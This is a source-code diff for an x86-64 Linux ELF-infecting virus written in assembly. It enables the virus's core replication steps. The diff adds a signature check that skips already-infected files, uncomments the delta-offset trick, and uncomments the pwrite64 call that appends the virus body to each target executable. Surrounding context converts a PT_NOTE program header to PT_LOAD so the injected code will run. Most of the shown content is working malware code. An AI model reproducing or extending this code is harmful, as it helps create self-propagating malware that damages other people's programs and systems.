@@ -126,7 +126,9 @@ _start:
 			jnz .close_file  
 			cmp byte [r15 + 148], 2                    ; check if target ELF is 64bit
 			jne .close_file
-
+        .is_infected:
+            cmp dword [r15 + 152], 0x00455244                   ; check signature in [r15 + 152] ehdr.pad (TMZ in little-endian, plus trailing zero to fill up a word size)
+            jz .close_file   
 		mov r8, [r15 + 176]                                 ; r8 now holds ehdr.phoff from [r15 + 176]
 		xor rbx, rbx                                        ; initializing phdr loop counter in rbx
 		xor r14, r14                                        ; r14 will hold phdr file offset
@@ -173,22 +175,22 @@ _start:
 				syscall                                         ; getting target EOF offset in rax
 				push rax                                        ; saving target EOF
 
-			; 	call .delta                                     ; the age old trick
-			; 	.delta:
-			; 		pop rbp
-			; 		sub rbp, .delta
+				call .delta                                     ; the age old trick
+				.delta:
+					pop rbp
+					sub rbp, .delta
 
-			; 	; writing virus body to EOF
-			; 	mov rdi, r9                                     ; r9 contains fd
-			; 	lea rsi, [rbp + _start]                        ; loading _start address in rsi
-			; 	mov rdx, exit - _start                       ; virus size
-			; 	mov r10, rax                                    ; rax contains target EOF offset from previous syscall
-			; 	mov rax, SYS_PWRITE64
-			; 	syscall
+				; writing virus body to EOF
+				mov rdi, r9                                     ; r9 contains fd
+				lea rsi, [rbp + _start]                        ; loading _start address in rsi
+				mov rdx, exit - _start                       ; virus size
+				mov r10, rax                                    ; rax contains target EOF offset from previous syscall
+				mov rax, SYS_PWRITE64
+				syscall
 
 
-			; 	cmp rax, 0
-			; 	jle .close_file
+				cmp rax, 0
+				jle .close_file
 
 		    .patch_phdr:
                 mov dword [r15 + 208], PT_LOAD                  ; change phdr type in [r15 + 208] from PT_NOTE to PT_LOAD (1)
